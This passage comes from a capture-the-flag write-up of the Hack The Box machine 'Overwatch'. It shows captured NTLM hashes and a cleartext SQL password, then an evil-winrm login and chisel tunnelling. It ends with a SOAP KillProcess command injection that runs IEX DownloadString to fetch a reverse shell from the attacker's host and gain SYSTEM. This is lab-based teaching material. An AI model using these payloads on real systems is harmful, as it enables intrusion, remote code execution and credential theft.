+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.13.144</span><br><span class="line">[SMB] NTLMv2-SSP Username : OVERWATCH\S200401$</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : S200401$::OVERWATCH:6c87db85ff35e118:347DB0A03285FD43B19D4B9EEDD20E63:0101000000000000001395621E8FDC01C60DBBA76CA365DD000000000200080049004F003100480001001E00570049004E002D003300580037003200460041003400360033005A00490004003400570049004E002D003300580037003200460041003400360033005A0049002E0049004F00310048002E004C004F00430041004C000300140049004F00310048002E004C004F00430041004C000500140049004F00310048002E004C004F00430041004C0007000800001395621E8FDC01060004000200000008003000300000000000000000000000003000008209249D1A66C54849E83ECC14D55FF153370E8DC8072E9C3840C5E74ADB47E20A001000000000000000000000000000000000000900140063006900660073002F00530051004C00300037000000000000000000                                                                                                              </span><br><span class="line">[*] Skipping previously captured hash for OVERWATCH\S200401$</span><br><span class="line">[*] Skipping previously captured hash for OVERWATCH\S200401$</span><br><span class="line">[MSSQL] Cleartext Client   : 10.129.13.144</span><br><span class="line">[MSSQL] Cleartext Hostname : SQL07 ()</span><br><span class="line">[MSSQL] Cleartext Username : sqlmgmt</span><br><span class="line">[MSSQL] Cleartext Password : bIhBbzMMnB82yx</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We now have a domain user <code>sqlmgmt:bIhBbzMMnB82yx</code>.</p>
+<h2 id="User-Flag-WinRM-as-sqlmgmt"><a href="#User-Flag-WinRM-as-sqlmgmt" class="headerlink" title="User Flag - WinRM as sqlmgmt"></a>User Flag - WinRM as sqlmgmt</h2><p><code>sqlmgmt</code> is a member of Remote Management Users (port 5985 was open in the nmap output), so evil-winrm gets us a shell straight away:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/overwatch]</span><br><span class="line">└─$ evil-winrm -i 10.129.13.144 -u sqlmgmt -p bIhBbzMMnB82yx</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class="string">&#x27; for module Reline                                                                                                        </span></span><br><span class="line"><span class="string">                                        </span></span><br><span class="line"><span class="string">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   </span></span><br><span class="line"><span class="string">                                        </span></span><br><span class="line"><span class="string">Info: Establishing connection to remote endpoint</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; cd ../desktop</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\sqlmgmt\desktop&gt; cat user.txt</span></span><br><span class="line"><span class="string">9f7ef3a92daed23e57a5d6fb6c65ed26</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\sqlmgmt\desktop&gt; </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-SOAP-KillProcess-Command-Injection"><a href="#Privilege-Escalation-SOAP-KillProcess-Command-Injection" class="headerlink" title="Privilege Escalation - SOAP KillProcess Command Injection"></a>Privilege Escalation - SOAP KillProcess Command Injection</h2><p>Going back to the <code>overwatch.exe</code> binary, the <code>MonitoringService</code> class exposes a SOAP service over HTTP. Looking at its <code>KillProcess</code> method we can see exactly why it’s interesting:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Overwatch/killprocess.png"
+                      alt="overwatch-killprocess"
+                ><figcaption>overwatch-killprocess</figcaption></figure></p>
+<p>The <code>processName</code> argument is concatenated directly into a PowerShell <code>Stop-Process -Name &lt;input&gt; -Force</code> script and pushed into a runspace. No quoting, no validation — pure command injection via a <code>;</code> separator.</p>
+<p>The service binds to <code>127.0.0.1:8000</code> (only listening on loopback), so we need to forward that port out. Chisel is the easiest tool for that — we run the server on Kali in reverse mode and the client on the box:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ ./chisel server --reverse --port 9000                 </span><br><span class="line">2026/01/27 00:36:49 server: Reverse tunnelling enabled</span><br><span class="line">2026/01/27 00:36:49 server: Fingerprint 0rf64VJVbnlSzRX9dYWqmrsItxRIUnGuYTW1BQaoww8=</span><br><span class="line">2026/01/27 00:36:49 server: Listening on http://0.0.0.0:9000</span><br><span class="line">2026/01/27 00:37:11 server: session#1: tun: proxy#R:8000=&gt;8000: Listening</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\sqlmgmt\desktop&gt; ./chisel.exe client 10.10.16.79:9000 R:8000:127.0.0.1:8000</span><br><span class="line">chisel.exe : 2026/01/26 21:37:10 client: Connecting to ws://10.10.16.79:9000</span><br><span class="line">    + CategoryInfo          : NotSpecified: (2026/01/26 21:3...0.10.16.79:9000:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">2026/01/26 21:37:13 client: Connected (Latency 260.0434ms)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The internal SOAP endpoint is now reachable on our local <code>127.0.0.1:8000</code>. We craft a SOAP envelope that calls <code>KillProcess</code> with an injected PowerShell payload that pulls our reverse shell:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST \</span><br><span class="line">  -H &quot;Content-Type: text/xml; charset=utf-8&quot; \</span><br><span class="line">  -H &quot;SOAPAction: http://tempuri.org/IMonitoringService/KillProcess&quot; \</span><br><span class="line">  -d &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">  &lt;soap:Body&gt;</span><br><span class="line">    &lt;KillProcess xmlns=&quot;http://tempuri.org/&quot;&gt;</span><br><span class="line">      &lt;processName&gt;notepad; IEX(New-Object Net.WebClient).DownloadString(&#x27;\&#x27;&#x27;http://10.10.16.79/shell.ps1&#x27;\&#x27;&#x27;);#&lt;/processName&gt;</span><br><span class="line">    &lt;/KillProcess&gt;</span><br><span class="line">  &lt;/soap:Body&gt;</span><br><span class="line">&lt;/soap:Envelope&gt;&#x27;   http://127.0.0.1:8000/MonitorService</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><code>shell.ps1</code> is a vanilla <code>nishang</code> reverse shell pointing back at us on port <code>9002</code>. We serve it over a Python HTTP server:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> python3 -m http.server 80  </span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.129.13.144 - - [27/Jan/2026 00:42:05] &quot;GET /shell.ps1 HTTP/1.1&quot; 200 -</span><br><span class="line">10.129.13.144 - - [27/Jan/2026 00:42:15] &quot;GET /shell.ps1 HTTP/1.1&quot; 200 -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And the catch comes back as <code>NT AUTHORITY\SYSTEM</code> since the monitoring service was running with full system privileges:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lvnp 9002</span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [10.10.16.79] from (UNKNOWN) [10.129.13.144] 58004</span><br><span class="line"></span><br><span class="line">PS C:\Software\Monitoring&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line">PS C:\Software\Monitoring&gt; cd ../../users/administrator/desktop</span><br><span class="line">PS C:\users\administrator\desktop&gt; cat root.txt</span><br><span class="line">38c9a8584ce0dde819efe21c28e4d4cc</span><br><span class="line">PS C:\users\administrator\desktop&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for Overwatch, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Overwatch</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-05-11 19:35:10</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-11 21:06:46
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/05/11/Hackthebox-Overwatch/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/04/26/Hackthebox-Sorcery/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Sorcery</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Overwatch</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB-Enumeration"><span class="nav-text">SMB Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reversing-the-NET-Binary"><span class="nav-text">Reversing the .NET Binary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-Coercion-Linked-Server-Capture"><span class="nav-text">NTLM Coercion + Linked-Server Capture</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Flag-WinRM-as-sqlmgmt"><span class="nav-text">User Flag - WinRM as sqlmgmt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-SOAP-KillProcess-Command-Injection"><span class="nav-text">Privilege Escalation - SOAP KillProcess Command Injection</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
